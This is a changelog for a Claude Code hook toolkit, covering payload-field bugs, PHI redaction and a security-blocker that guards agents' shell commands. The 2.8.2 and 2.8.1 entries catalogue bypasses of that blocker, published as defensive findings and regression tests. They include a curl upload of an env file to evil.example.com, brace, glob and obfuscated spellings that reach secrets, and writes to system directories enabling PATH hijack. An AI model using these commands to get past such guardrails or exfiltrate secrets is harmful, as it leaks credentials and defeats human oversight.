  dumper hook). The full MessageDisplay payload is `session_id`,
  `transcript_path`, `cwd`, `prompt_id`, `hook_event_name`, `turn_id`,
  `message_id`, `index`, `final`, `delta`.
- The handler tried five candidate names — `message`, `text`,
  `assistant_message`, `last_assistant_message`, `tool_input.message` — chosen
  because "docs are sparse on exact field naming". **All five appear in 0 of them.** So the allowlist stripped three of them *and* every name
  was wrong: fixing only the normalizer would have changed nothing. This is a
  PHI redaction path, opt-in via `CONTINUITY_PHI_OUTPUT_REDACT=1`.
- Its test suite was fully green throughout, because every test built a
  `HookInput` by hand and asserted a shape that does not exist. The tests now
  drive raw captured JSON through `parseHookInput`.
- **Chunking is routine.** `delta`/`index`/`final` are a streaming protocol and
  CC emits **one event per markdown block** — across 41 records `index` ran 0-9
  and the largest message arrived as 10 separate events. The hook is invoked once
  per paragraph, with no state between invocations.
  - At every boundary OBSERVED, per-chunk scanning is safe: all non-final chunks
    ended in a blank line, no single-chunk delta contained one, and no
    phi-redactor pattern can span a blank line. Not a guarantee, though — CC's
    own doc calls a delta "the newly completed **lines**", which does not exclude
    a single-newline flush, and two patterns (`us-phone-parens`,
    `credit-card-spaced`) use a one-character separator class that `\n`
    satisfies. A card wrapped mid-number across a line would display in full.
  - **The output side was wrong too — see below.** It is now fixed and verified
    end-to-end, not merely asserted.
  - An earlier draft of this entry called chunking unobserved and reasoned from
    "longest delta 202 chars". That was a sampling artifact: the first 22 records
    were all single short paragraphs. Caught by adversarial review; recorded
    rather than quietly corrected, because it is the same partial-capture error
    that produced the false timeout guarantee in PR #55.

### Changed — redaction quality (all from adversarial review)

- **Credit-card patterns are now Luhn-gated**, and a `validate` hook on
  `PhiPattern` provides the mechanism. A grouped non-card number
  (`build 1234-5678-9012-3456`) is no longer redacted. This is a filter, not a
  proof — roughly 1 grouped 16-digit number in 10 passes Luhn by chance, and a
  test pins that honestly rather than claiming precision the gate cannot give.
- **New `credit-card-plain` pattern** for 13-19 unseparated digits, closing a
  recall gap (a pasted card is at least as likely to arrive unformatted). Only
  safe *because* of the Luhn gate.
- `totalSubstitutions` now counts substitutions **actually applied**, not regex
  matches. With a `validate` veto the two differ, and the count feeds the hook's
  `Redacted N match(es)` log line — reporting vetoed matches would assert
  redactions that never happened, the same class as the `displayContent` defect.
- **`redactPhi` fails closed on non-string input.** It threw
  `current.match is not a function` for a number/object/array, and returned
  `{ text: null }` for null — a value its own `text: string` type says cannot
  exist. Unusable input now yields empty text, never the uninspected original.
- **The module's "very low false-positive rates" claim was false and is
  corrected in place.** `commits 100-200-3000` → `[PHONE-REDACTED]` and
  `build 123-45-6789` → `[SSN-REDACTED]`; nothing in a regex separates those
  from the real thing. Documented with the reasoning: a false positive costs
  confusion on a display-only transform, a false negative costs unredacted PHI
  on screen, and the bias is deliberate.

### Fixed — dead code that looked load-bearing

- `error-warner` gated on `tool_response.exit_code`, which the captured Bash
  payload does not carry, so that branch never ran and detection always rested
  entirely on the substring heuristics after it. Removed, with the reason
  recorded inline. Its test asserted `output` + `exit_code` — two fields CC never
  sends — and passed identically with both stripped.

### Changed — shared types absorb what handlers were re-declaring

- `tool_response`, `error` and `is_interrupt` move onto `HookInput`. Four
  handlers each carried a local `interface X extends HookInput` for them — the
  exact pattern that made the original defect invisible. All four local
  interfaces are gone.
- `HookInput` gains the captured MessageDisplay fields (`delta`, `index`,
  `final`, `message_id`, `turn_id`, `prompt_id`).
- `effort`, `background_tasks` and `session_crons` were declared on `HookInput`
  but were never in the allowlist, so a handler following types.ts's own advice
  ("Stop hooks observing a non-empty array should NOT deregister session state")
  would have read an empty value. They now arrive.
- `tool_response` deliberately has **no index signature** and does not declare
  `exit_code`: an undeclared field should require a visible cast rather than
  silently type-check as `unknown`.

## [2.9.0] - 2026-07-25 — four more handlers were inert, including a security control; plus a structural guard so the class stops recurring

`dist` is rebuilt (shared library + hook source changed).

### Fixed

**Four registered PostToolUse/PostToolUseFailure handlers never saw their payload.** Same root cause as 2.8.5 — `normalizeInput`'s `passThrough` allowlist — but in two distinct shapes:

| Handler | Read | Problem | Effect |
|---|---|---|---|
| `posttool/secret-detector` | `tool_output` | wrong name **and** not allowlisted | **never scanned a single byte of tool output for secrets** |
| `posttool/error-warner` | `tool_output` | wrong name **and** not allowlisted | never analyzed command output |
| `posttool/bash-output-measurer` | `tool_output` | wrong name **and** not allowlisted | recorded `outputBytes: 0` for every event |
| `posttool/failure-logger` | `error`, `is_interrupt` | names correct, **not allowlisted** | never logged a failure, never emitted a fix hint |

**Field names settled by live payload capture, not inference.** Temporary dumper hooks captured both events from CC 2.1.220:

- `PostToolUse` sends **`tool_response`** = `{stdout, stderr, interrupted, isImage, noOutputExpected}`
- `PostToolUseFailure` sends **`error`** (string) + **`is_interrupt`** (boolean)
- **`tool_output` is sent by neither event** — the three handlers read a key Claude Code has never produced

Renamed `tool_output` → `tool_response` in the three PostToolUse handlers, and added `tool_response`, `error`, `is_interrupt` to `passThrough`. For the three renamed handlers either change alone would have left them inert; `failure-logger` needed only the allowlist entry.

An earlier draft of the issue claimed `is_interrupt` was absent from the binary. That was wrong — it came from counting *quoted* occurrences for one field and *quoted + bare* for another. The capture settled it: `is_interrupt` is real.

### Added

- **A structural guard** (`tests/lib/passthrough-completeness.test.ts`). Every prior fix pinned specific field *names*; those tests pass while new instances ship — 2,075 green tests coexisted with these four inert handlers. The guard parses every `interface X extends HookInput { … }` across **the shared tree and all five plugin hook trees** and asserts each declared field appears in `passThrough`, reporting the offending `file → field` pairs. Verified against three must-fail controls: removing the allowlist entries, reverting one rename, and planting a violation in a plugin directory.

  **It is a net, not a proof.** It matches one declaration form, so a cast, bracket access, destructuring, a type alias, or a multi-base interface all pass it unseen — and those need no declaration at all, making them the *likely* shape of the next instance. It also does not parse `HookInput` itself, which declares `effort`, `background_tasks` and `session_crons` — none allowlisted. A live example the guard cannot see sits in the tree today: `phi-output-redactor` reads `message`/`text`/`assistant_message` by bracket access; all three are stripped. Full bypass list is documented in the test header. **The real class fix is to stop `normalizeInput` dropping data at all** — forward unknown fields, denylist what must be scrubbed. The allowlist enforces no security boundary (it is CC's own payload either way), so it buys nothing and costs silent data loss. Tracked separately.

- **End-to-end payload tests** (`tests/posttool/posttool-payload-e2e.test.ts`) driving raw captured JSON through `parseHookInput` into each of the four handlers. Every pre-existing test for these built a `HookInput` by hand — a shape that never occurs at runtime — which is why the defect was invisible. **7 of the 8 fail on pre-fix code.**

### Correction to an earlier draft of this entry

An earlier draft claimed `error-warner` stayed inert for a second reason: that no `error_rules.json` exists in the repo or shipped plugin. **That was false.** The file is git-tracked at `shared/configs/rules/error_rules.json` and symlinked into `plugins/continuity-toolkit/.claude/rules/`, and `loadErrorRules()` finds it via its `$CLAUDE_PLUGIN_ROOT` fallback. **The field rename alone fully restores `error-warner`** — verified end-to-end with no mocks, emitting a real tip from the shipped rules.

The false claim had a cost worth recording: the e2e test for that handler was deliberately weakened to `expect(result.continue).toBe(true)`, which is **tautological** (`errorWarner` returns `continue: true` on every path, including the inert one) and passed identically before and after the fix. It is now a real assertion.

Root cause of the error: the check was `find … -not -path … 2>/dev/null`. The local `rtk` proxy rejects `find` with compound predicates, and `2>/dev/null` swallowed that error — turning a **tool failure** into a convincing empty result. `git ls-files | grep` refutes it in one command.

Separately noted: `error-warner`'s `exit_code` branch is unreachable for Bash — the captured `tool_response` carries no `exit_code`, so error detection rests entirely on its substring heuristics.

### Note

Behaviorally inert for dtk/atk/ftk/etk — none of their registered hooks read these fields — so their `dist` is rebuilt for source consistency but their versions are unchanged.

## [2.8.5] - 2026-07-25 — 2.8.4's fix was inert: `normalizeInput` stripped the very fields it taught the handlers to read

`dist` is rebuilt (shared library source changed).

### Fixed

**`normalizeInput()` in `lib/input.ts` is an allowlist, and 2.8.4's field names were not on it.** The function does not pass the parsed payload through — it builds a *new* object from `tool_name`, `session_id`, `tool_input` plus a fixed `passThrough` array. That array still listed the old `agent_id`/`agent_type` and never listed `teammate_name`, `team_name`, `task_id`, `task_subject`, or `task_description`.

So 2.8.4 corrected the three agent-team handlers to read the right fields, and normalization deleted those fields one layer earlier. **Every real teammate idle still recorded `"unknown"` — the exact symptom 2.8.4 set out to fix.** The handlers' `input.teammate_name || 'unknown'` turned a dropped field into a plausible default instead of an error, which is why it looked like it had worked.

Added the five agent-team fields to `passThrough`. Legacy `agent_id`/`agent_type` are retained for any event that does send them.

**Why 2.8.4's verification missed it.** That release was checked three ways — the v2.1.215 binary's hook-input strings, a live named-teammate probe, and the agent-team message envelope. All three answer *what Claude Code sends*. None checked *what our own normalizer forwards*. The live probe recorded `"unknown"` and that was read as confirmation the old code was broken; the new code produces an identical symptom by a different mechanism, so the probe could not distinguish them.

Evidence for this fix:
- A raw `TeammateIdle` payload captured from a live idle contains `"teammate_name":"r1-probe-C","team_name":"session-9d7a8f62"` — 2.8.4's field names are correct.
- Feeding that exact payload to the installed 2.8.4 hook wrote `teammate_name: "unknown"`, reproducibly.

### Added

- **End-to-end regression tests that drive the raw payload through `parseHookInput` into the handler**, rather than constructing a `HookInput` by hand. Every pre-existing test in `teammate-idle-saver.test.ts` built the input object directly — a shape that never occurs at runtime — which is why 2,073 green tests did not catch this. The new tests fail on 2.8.4 with `expected 'unknown' to be 'r1-probe-C'` (verified by reverting the fix) and pass on 2.8.5.
- A comment on `passThrough` recording that it is an allowlist and that adding a field read to a handler requires adding it here too.

### Note

Behaviorally inert for dtk/atk/ftk/etk — none of their registered hooks read these fields — so their `dist` is rebuilt for source consistency but their versions are unchanged.

## [2.8.4] - 2026-07-19 — the three agent-team lifecycle hooks read fields Claude Code never sends; they logged "unknown" since they shipped

> **⚠ CORRECTION (2026-07-25, see [2.8.5]):** the field names below are correct, but **this release did not take effect**. `normalizeInput()` stripped `teammate_name`/`team_name`/`task_*` before any handler saw them, so the hooks continued to log `"unknown"` exactly as before. Fixed in 2.8.5. The "verified three independent ways" claim below verified what CC *sends* — not that the fields survived our own input normalization. Annotating rather than rewriting, so a reader landing here is not handed a fix that never worked.

Behavior change in the `TeammateIdle`, `TaskCreated` and `TaskCompleted` hooks. **`dist` is rebuilt** — this compiles from changed hook source, unlike 2.8.3.

### Fixed

**All three hooks keyed on `agent_id`/`agent_type`, which are absent from these three payloads.** CC's own hook-input descriptions — read straight out of the v2.1.215 binary — say the payloads carry different fields:

- `TeammateIdle`: *"Input to command is JSON with **teammate_name and team_name**."*
- `TaskCreated` / `TaskCompleted`: *"Input to command is JSON with **task_id, task_subject, task_description, teammate_name, and team_name**."*

Neither `agent_id` nor `agent_type` appears in any of the three. So `teammate-idle-saver` wrote `last_agent_idle: { agent_id: "unknown", agent_type: "unknown" }` on **every** real idle since it shipped, and the two task loggers recorded `agent_id: "unknown"` while never capturing the `task_id`/`task_subject`/`task_description` the event actually delivers. `session_id` is a genuine common field (present in all inputs) and is retained.

This was found by direct measurement, not code reading: a live named teammate went idle and the deployed hook recorded `"unknown"`, exactly as the code implied it must. The binary and the CC agent-team message envelope (`teammate_id="…"`) corroborate the field names. A subagent tasked with the docs answer had confidently reported a `teammate_status` field as "documented" — it appears **zero** times in the binary; the verification against ground truth is the only reason it did not ship.

### Changed

- `HookInput` (shared types) gains `teammate_name`, `team_name`, `task_id`, `task_subject`, `task_description`, with a note that `teammate_name` is the teammate's *name* (used as a transcript-file prefix, `agent-a<name>-<hash>.jsonl`), not its transcript id — locating a teammate transcript needs a prefix match, not concatenation.
- `last_agent_idle` now records `{ teammate_name, team_name, timestamp }`. Consumers reading the old `agent_id`/`agent_type` keys will see them absent; nothing in-repo consumed them except the hook's own tests.
- The task loggers now record `{ event, timestamp, task_id, session_id, task_subject?, task_description?, teammate_name?, team_name? }`. `TaskCompleted` gains the `event: 'completed'` discriminator it was missing, so created/completed rows in the shared `tasks.jsonl` are distinguishable.

Prerequisite for the planned subagent-visibility detector, which must derive a teammate's transcript path from the idle payload — impossible while that payload was being read through the wrong keys.

## [2.8.3] - 2026-07-19 — the 2.8.2 release notes shipped a false measurement; two test labels claimed a mechanism they do not cover

Docs, comments and test labels only. **No code, pattern or behavior change** — `security-blocker.ts` is untouched and `dist` is unchanged, because nothing it compiles from changed.

### Fixed

**The 2.8.2 false-positive accounting was wrong — 3 claimed, 11 actual.** The entry asserted "swept against 27 realistic developer commands. Three are newly denied … only the first is a real misfire." Two independent reviewers each found more, and re-measuring confirmed **eleven** across three families. The sweep that produced "three" simply never contained the gitignore, glob or template families — it was a corpus gap, and the conclusion inherited it.

The misfires it missed are worse than the one it named. `echo "*.env" >> .gitignore` is a *security-positive* setup action that never opens the file; `git check-ignore`, `ls -la` and `find -name` on a glob are metadata-only; `docker inspect -f '{{.env}}'` and the `jsonpath='{.items[*]…env}'` idiom are selectors, and that Go-template shape also hits `helm` and `nomad`. The 2.8.2 entry now carries the corrected table and a pointer here.

In a project whose stated discipline is *measure, don't assert*, a false measurement in the release notes is the exact failure that discipline exists to prevent. The trade 2.8.2 made is still the right one; the record of its cost was not.

**Stale comment contradicting the code it documents** — `hooks/tests/pretool/security-blocker.test.ts`. A block introduced with the first commit of 2.8.2 read "`@` joined the lookbehind class in 2.8.2." `@` joined nothing: the second commit *removed* the character class entirely in favour of an inverted lookbehind. A leftover from a mid-flight redesign, describing behavior that no longer exists.

**One test label overstated; the other was right.** `cat [.].env` and `cat {.env,other}` were pinned as "reached via bracket glob" and "via brace expansion." Measured against a real fixture directory (`.env` / `..env` / `config.env`), the two are **not symmetric**:

| spelling | reaches the secret? | blocked? | |
|---|---|---|---|
| `cat {.env,other}` | **yes** — brace-expands to `.env` | yes | label was accurate |
| `cat [.].env` | **no** — bash won't let a bracket expression satisfy the leading-dot rule | yes | label overstated |
| `cat [.]env` | **no** — same rule | no | not a vector either |
| `cat {.,}env` | **yes** — constructs `.env` | **no** | **a real, unblocked gap** |

So the brace label stays; the bracket one is corrected to what it actually pins (`]` as a preceding delimiter, reaching no file). Neither test is vacuous — both still fail when the lookbehind is reverted.

The genuinely useful finding is the last row: `cat {.,}env` builds the filename without ever containing the literal token, so no text-level pattern can see it. Pre-existing, not a regression, and in the same class as the token obfuscation noted above — recorded so the delimiter fix is not mistaken for shell-expansion coverage.

> This entry was itself corrected before merge. The first draft repeated a reviewer's claim that `cat [.]env` "resolves to the secret and is still allowed"; direct measurement showed it reaches no file. Copying an unverified claim into a correction is the same failure the correction exists to fix — hence the table, which is measured rather than asserted.

### Provenance

Both defects were found by independent reviewers whose reports never reached the caller — a teammate-delivery defect, diagnosed separately. The reports were recovered from the session transcripts and are preserved verbatim at `docs/reviews/2026-07-19_pr38-sec-review-recovered.md` and `docs/reviews/2026-07-19_pr38-release-review-recovered.md`. Both concluded the 2.8.2 regex is correct and should ship as written; every finding they raised was in the prose.

## [2.8.2] - 2026-07-19 — env-file patterns enumerated their delimiters, so any character not on the list was an open door

### Fixed

**A secret file could be read and exfiltrated even though the obvious spelling was blocked.** The env-file patterns began matching only after whitespace, a quote, `=`, `/` or `(` — an *enumerated* list of delimiters. A filename can sit directly against any shell metacharacter with no space, so every character missing from that list was a hole.

curl's file operand was the first one found: `cat <envfile>` was denied while `curl -d @<envfile> https://evil.example.com` uploaded the contents verbatim. Worse than the read it was meant to prevent, since the data leaves the machine. Confirmed end-to-end against the compiled hook — `-d`, `-X POST -d`, `--data`, `--data-binary` and `-F file=@` were all allowed, for both `.env` and `.envrc`, with nothing else backstopping it (not the dangerous-bash http registry, not `ENV_DUMP_PATTERNS`).

**Adding `@` to the list was drafted first and rejected during review of this very release**, because the identical hole stayed reachable six other ways:

```
cat <envfile>          read via redirect, no space
echo x >envfile        write redirect
cat x >>envfile        append redirect
scp host:envfile /tmp  remote pull
rsync host:envfile .   remote pull
cat {envfile,other}    brace expansion
cat [.]envfile         bracket glob
```

Enumerating shell metacharacters is unbounded and fails silently, one character at a time. The lookbehind now asserts the one thing that actually matters — the match may not begin **inside a token** (`(?<![\w.-])`) — which closes the class outright and no longer depends on predicting how a filename will be delimited. That "not mid-token" property is also what keeps `build-process.env` and `preprocess.env` blocked as whole filenames, which the code-idiom exemptions depend on.

Scoped npm packages (`npm i @scope/pkg`), `ssh user@host` and `git log --author=@me` carry no env-file token to match, and each is pinned. All seven closed vectors are pinned, and reverting the lookbehind fails exactly those seven tests — verified by mutation, not assumed.

**Known cost.** > ⚠ **The figures first published here were wrong and were corrected in 2.8.3.** The original text claimed "three are newly denied … only the first is a real misfire." The true count is **at least eleven**, across three families, and several are worse misfires than the one singled out. The corrected accounting is below; see the 2.8.3 entry for how the error happened.

The inversion blocks strictly more than the enumerated form. Newly denied, by family:

```
# selector / template idioms — not file references at all
kubectl get pod  -o jsonpath='{.env}'
kubectl get pods -o jsonpath='{.items[*].spec.containers[*].env}'
docker inspect -f '{{.env}}' web            # same shape hits helm / nomad

# gitignore and metadata-only operations — these never read the file
echo "*.env" >> .gitignore                  # security-POSITIVE setup action
echo "!.env.example" >> .gitignore
git check-ignore *.env
ls -la *.env
find . -name "*.env"

# literal env-file mentions in message text
git commit -m "[.env] rotate keys"
echo "see {.env,.env.local}"
```

Only the last family is "consistent with existing behavior" (`git commit -m "update .env"` has always been blocked). The first two families are genuine misfires: a JSONPath or Go-template selector is not a file reference, and writing an ignore rule for env files is a routine, security-positive action that never opens the file.

This is still accepted deliberately — the alternative leaves brace expansion, redirects and `scp host:` open, and those are genuine read and exfiltration paths. But a PreToolUse deny is terminal for a forked skill, so the cost is real. If it proves annoying, the narrow fixes are a selector/template exemption and a glob/ignore-rule exemption — **not** a return to enumerating delimiters.

**Scope of the fix — the delimiter class only.** Token obfuscation is untouched and still reaches the file: `cat .e"n"v`, `cat .[e]nv`, `X=env; cat .$X`, `cp *env /tmp/x`. None are regressions (all defeat the pre-2.8.2 pattern identically) and none are reachable by any lookbehind change, since they remove the literal token from the command text. Do not read the delimiter fix as completeness.

### Added

**Dotted-prefix laundering is now pinned** (`cat my.process.env`, `touch x.process.env`, `cp secrets x.process.env`, …). These already passed; they are pinned because a *proposed* relaxation for this release — exempting `process.env` at any dot-segment boundary, so that `globalThis.process.env` stopped being a false positive — would have flipped every one of them to allowed. The existing suite could not have caught it: the two laundering cases pinned in 2.8.1 use a hyphen (`build-process.env`) and a bare prefix (`preprocess.env`), never a dot, leaving the whole family unprobed. **The change would have shipped green.** It was withdrawn at the design gate after independent adversarial review.

### Not fixed (deliberately)

`globalThis.process.env` and `window.process.env` are still blocked as false positives. Bare `process.env` and `import.meta.env` work, and that is the common spelling. Two independent designs to relax this have now failed for the same structural reason recorded in this file for system directories: `globalThis.process.env` and `my.process.env` are lexically identical, so no regex over unparsed text can permit the first without permitting the second. Any future attempt must confront the pinned laundering family above.

Three known gaps remain queued, each its own change because all three *add* blocking: patterns require a trailing slash (`rm -r /etc` misses); patterns are case-sensitive (`/ETC/passwd` misses on macOS); and line 171's `.envrc` lookaheads exempt an idiom that does not exist in any language and should be deleted rather than carried forward.

## [2.8.1] - 2026-07-19 — narrow security-blocker fixes; the read carve-out was attempted twice and withdrawn

`BASH_SENSITIVE_PATTERNS` matches the **raw text** of a command against a path list, for every command, regardless of what the command does. Mentioning a path is enough — so a `--version` probe on an absolute binary path, `cat /etc/hosts`, and any script or commit message containing `process.env` were all denied. Because a PreToolUse deny is **terminal for a subagent**, this silently killed multi-agent runs mid-flight; four agents died this way while reviewing ctk 2.8.0.

**This release fixes only the part that can be fixed safely.** Two attempts to allow read-only access to system directories were built and both were demolished by adversarial review before merge:

1. A **blocklist of mutating verbs** let every writer outside the list through — `python3 -c "open(…,'w')"`, `sed -i`, `find -delete`, `tar -C`, `touch`, `mkdir`, `git checkout --`. It also missed fd-numbered redirects (`1>`), compared only the *first* path occurrence against the redirect position (so `cat <sysfile> > <sysfile>` passed), and let `cd <sysdir> && rm -rf .` launder the target into another segment.
2. An **allowlist of safe readers** leaked through a pipe-then-absolute-path segment split (`ls | /usr/bin/tee <syspath>`), through command substitution (`cat "$(touch <syspath>)"`, which also readmitted `sed -i` and `find -delete`), and through two-operand writers that ride in on the allowlist — `sort -o`, `uniq IN OUT`, `xxd IN OUT`.

Both share one root cause: deciding *"is this path the target of a write?"* requires a shell parse, and a position-0 regex over unparsed text was certifying a segment that can hold more than one command. The payoff was convenience; the demonstrated failure mode was arbitrary writes to `/usr/local/bin` and `/etc/cron.d` — a PATH hijack needing no sudo on a default Homebrew Mac. **System directories therefore stay deny-by-default.** The nine demonstrated bypasses ship as regression tests so a future attempt has to confront them rather than rediscover them.

### Fixed — the narrowly-safe half

- **The `process.env` / `import.meta.env` idioms no longer read as file access.** The exemption is anchored to the **exact token**, not to preceding bytes: a byte test (`(?<!process)`) would also suppress real filenames like `build-process.env` and could be laundered by creating one. This was the most frequent false positive by far — it blocked commits whose *message* described an environment variable.
- **`/proc/<pid>/environ` is now always blocked.** `ENV_DUMP_PATTERNS` exists to stop env-var leakage via `env`/`printenv`; reading it out of procfs walked straight around that control.
- **A bare `env`/`printenv` invoked by absolute path is now caught on its own merits.** It was previously blocked only as a side effect of the blanket system-binaries rule — as the old test's own comment admitted — so any relaxation of that rule would have opened a real dump bypass.
- **Credential material under otherwise-readable trees** — private TLS keys, kube and docker config, mounted secrets, keytabs, `p12`/`pfx`/`jks`, kubeconfig. The filename pattern requires a **name before the extension** and rejects property access, after a first draft denied `jq '.key'`, `m.key(1)` and `schema.key.ts` — a fresh instance of the very over-blocking this release exists to fix.

### Known gaps, deliberately not addressed here

- System-directory patterns require a **trailing slash**, so a bare operand (`rm -r /etc`) misses. Pre-existing and identical on 2.8.0; tightening it would add blocks, which is the opposite of this release's purpose, so it is left for its own change.
- Patterns are **case-sensitive**, so `/ETC/passwd` misses on a case-insensitive filesystem. Pre-existing, same on 2.8.0.
- `globalThis.process.env` and `window.process.env` remain denied — the exemption is exact-token by design.

## [2.8.0] - 2026-07-19 — context warnings never fired; statusline surfaces discarded payload fields

### Fixed — the context-warning pipeline was dead for every user

**ctk's flagship feature did not work.** The statusline writes the context-percentage file and the `context-monitor` hook reads it, keyed by session id on both sides — but the two used *different precedence*. The writer read `process.env.CLAUDE_SESSION_ID` only, and **Claude Code does not export that variable into the statusline child process**, so every file was written as `claude-context-pct-default.txt`. The hook receives `session_id` in its input and looked for `claude-context-pct-<uuid>.txt`, which never existed. `readPercentage()` returned null, `contextMonitor()` silent-succeeded, and the 70/80/90% warnings could not fire for anyone.

The failure was invisible by construction: a missing file is a legitimate "statusline not configured" state, logged at **debug** level while the default log level is `warn`. Nothing errored; the feature simply never ran.

Proven on a live machine before and after: with the old build, the only file present was `-default.txt` while the hook — queried with the real session id — returned bare `{"continue":true,"suppressOutput":true}`. With the fix, the statusline writes `claude-context-pct-<session>.txt` and the same hook returns the 85% warning. `extractSessionId()` now mirrors the hook's `getSessionId()` precedence exactly (payload → env → `default`), with a test that asserts the two agree across every input shape.

This is the fourth hook in this repo found firing and doing nothing, after `lint-checker`, `error-warner` (both 2.7.3), and `/etk:review-mr`'s empty return (etk 2.14.1).

### Statusline surfaces the payload fields it was discarding

Claude Code hands the statusline a rich JSON payload on stdin; ctk parsed six fields and dropped the rest. Evaluated [claude-hud](https://github.com/jarrodwatts/claude-hud) (MIT) as a reference and adopted only what needs no new data source — the transcript-parsing features stay claude-hud's, cited rather than rebuilt. Field presence was **verified against a real captured payload** (CC 2.1.214), not assumed from docs. **`dist` rebuilt.**

### Added

- **Effort / mode badge** in the model bracket — `[Opus 4.8 ◐ xhigh]`, or `⚡ fast` in fast mode. From `effort.level`, `fast_mode`, `thinking.enabled` (verified live: `effort.level = "xhigh"`).
- **Rate-limit reset countdowns** — `session: █░░░░░░░░░ 11% (resets in 4h 31m)`. From `rate_limits.*.resets_at`, a Unix timestamp in **seconds** (verified live). Read independently of `used_percentage`, since either may be absent alone.
- **Token accounting line** — `tokens: 217.4k in · 826 out · 215.8k cached`. Counts are abbreviated because 1M-context sessions are live (`context_window_size = 1000000` observed), where raw figures are unreadable at statusline size. The cached segment is omitted when there are no cache reads.
- **Open-PR segment** — `PR #35 pending`, from `pr.{number,review_state}`. **Documented in the official schema but absent from the live capture** (the payload omits `pr` unless an open PR exists for the branch), so it is deliberately defensive: rendered only when the object and a numeric `number` are both present.
- **`CONTINUITY_STATUSLINE_COMPACT=1`** collapses output to the classic two lines.
- **`CONTINUITY_STATUSLINE_SILENT=1` — run alongside another statusline instead of instead of it.** Claude Code runs exactly one `statusLine` program, and running ctk's script is what writes the file the `context-monitor` hook reads, so adopting claude-hud (or any other statusline) previously meant giving up the context warnings. Silent mode performs the side effect and prints nothing, letting the other program own every pixel while the warnings keep firing. Every stdout path routes through one `emit` wrapper, including the fallback string, so nothing can leak into the other program's output. `/ctk:setup-context-monitor` Step 1a documents the composed launcher — including that stdin is consumable once and must be captured before being fed to both, and that a tool with its own configurator must be set up *first* because it claims `statusLine`. Verified end-to-end: with a stand-in HUD composed in, the display showed the HUD's lines only, ctk still wrote `pct=91`, and the hook returned `CONTEXT CRITICAL: 91%+`.
- **Two guards added after diffing the built output against 2.7.4** (neither was caught by unit tests): the token line is suppressed when every count is zero — a `context_window` with no token fields was rendering the pure-noise line `tokens: 0 in · 0 out` — and a reset countdown beyond eight days is treated as a malformed timestamp and omitted, since a `resets_at` supplied in milliseconds rendered `resets in 1136754d 12h`.
- Tests covering the new extractors and formatters, including that no-extras output stays byte-identical to the previous two/three-line rendering (pinned against bytes from the 2.7.4 build, not against the new code compared with itself).

### Fixed

- **`/ctk:doctor` reported a false healthy for context warnings.** Step 4 checked only whether `~/.config/claude/continuity-statusline.sh` *exists* — but that file survives untouched when `statusLine` is repointed at another program, so a user whose context warnings were dead got an "OK". Doctor now reads the configured `statusLine.command` and reports OK / NOT CONFIGURED / **CONFLICT**, naming the program and stating the consequence. Same false-healthy class as the `check-maintenance` `*.md` glob fixed in 2.7.1.

### Changed

- **`/ctk:setup-context-monitor` no longer overwrites an existing `statusLine` silently.** It now checks first (Step 0) and stops to ask when another program is configured. It also documents the genuine either/or: Claude Code runs one statusline, and ctk's script is the sole writer of the file the `context-monitor` hook reads — so choosing another statusline turns the 70/80/90% warnings off. claude-hud is cited as the option for transcript-derived tool/agent/todo tracking, which ctk does not duplicate.

## [2.7.4] - 2026-07-18 — stop blocking CC's own scratchpad directory

`security-blocker` (and the shared `isProtectedPath()` in `path-utils`) blocked **every** reference to `/private/tmp/` — including CC's harness-managed scratchpad at `/private/tmp/claude-<uid>/<project>/<session>/scratchpad`, which the CC system prompt instructs every session and subagent to use for temporary files. **`dist` rebuilt** (shared hook source changed).

### Fixed

- **The hook was killing forked skills mid-run.** Observed live: `/etk:review-mr` (a `context: fork` skill) ran `gh pr diff N > <scratchpad>/prN.diff` in Phase 3, the security-blocker denied it, and the fork terminated on the spot with no final message — the caller received the placeholder "Skill execution completed" (the same empty-return symptom etk 2.14.1's return-contract fix targeted; some past incidents were likely *this* bug). A PreToolUse deny inside a fork was **observed to be terminal** (live observation, corroborated three times this session — forked skill, subagent, and a plain commit whose *message* contained the path string; not documented CC behavior), so any subagent or forked skill following CC's scratchpad guidance died on its first scratchpad write.
- **Carve-out is deliberately narrow.** `/\/private\/tmp\/(?!claude-\d+\/)/` in `BASH_SENSITIVE_PATTERNS` and the mirrored `SYSTEM_DIR_PATTERNS` entry allow only paths *under* `/private/tmp/claude-<uid>/`. Still blocked: all other `/private/tmp/` paths, non-numeric suffixes (`claude-x/`), and the bare `claude-<uid>` root with no trailing slash (so `rm -rf /private/tmp/claude-501` remains denied).
- **Traversal guard on the carve-out** (adversarial review finding): bash patterns match raw command text with no `..` normalization, so a companion pattern blocks any `..` segment spelled from inside the allowed prefix (`/private/tmp/claude-501/../victim`, including sibling-scratchpad hops `../claude-999`). The Write/Edit layer was already immune (`path.normalize` runs before matching).

### Added

- 5 security-blocker tests (scratchpad bash redirect + Write allowed; outside-scratchpad, bare-root `rm -rf`, and non-uid suffix still blocked) and 2 `isProtectedPath()` tests pinning the carve-out in both layers.

## [2.7.3] - 2026-07-17 — revive two hooks that shipped dead (TypeScript lint + error rules)

Two PostToolUse hooks fired on every matching edit and did nothing. Both were **silent** no-ops, which is why they survived: a hook that reports nothing is indistinguishable from a hook that finds nothing. Found by a Software Factory audit of our own guardrails. **`dist` rebuilt** (shared hook source changed).

### Fixed

- **`lint-checker` linted no TypeScript at all — in a TypeScript monorepo.** `hooks.json` gated the hook on `*.ts`/`*.tsx`/`*.js`/`*.py`, but the implementation only ever handled `.py`/`.pyi`, so every TS edit spawned the hook and got zero lint. Biome was configured but no PostToolUse hook invoked it. The hook now lints JS/TS via **biome** alongside Python via **ruff**, routing per file extension. Verified end-to-end against the real built hook + real biome 1.9.4: an `x == 1` / `console.log` edit now returns `lint/suspicious/noDoubleEquals real.ts:2:7` where it previously returned silence.
- **`error-warner` could never load its rules.** Rules resolve from `$CLAUDE_PLUGIN_ROOT/.claude/rules/error_rules.json`; the hook is wired from ctk, and ctk shipped no `.claude/` directory — so `loadErrorRules()` returned `null` and the hook silently no-oped for every user, in every session. ctk now ships the default rules at the fallback path (a symlink to `shared/configs/rules/`, mirroring dtk). **No code change** — the resolution logic was always correct; the file was simply absent.
- **`lint-checker` never ran on `MultiEdit`, and never on `.jsx`/`.mjs`/`.cjs`/`.pyi`.** The `if` condition listed only `Write()`/`Edit()` clauses while the matcher claimed `Write|Edit|MultiEdit`, so no MultiEdit ever satisfied it — leaving multi-file edits unlinted **including Python**, a pre-existing gap in the ruff path. All clauses and extensions added.

### Added

- **Biome support in `lint-checker`**: `findBiome()` (project `node_modules/.bin` → PATH), `runBiomeCheck()`, `normalizeBiomeDiagnostic()`, and `offsetToRowCol()`. A single `biome check` yields both lint and format results, unlike ruff's separate `check` / `format --check`.
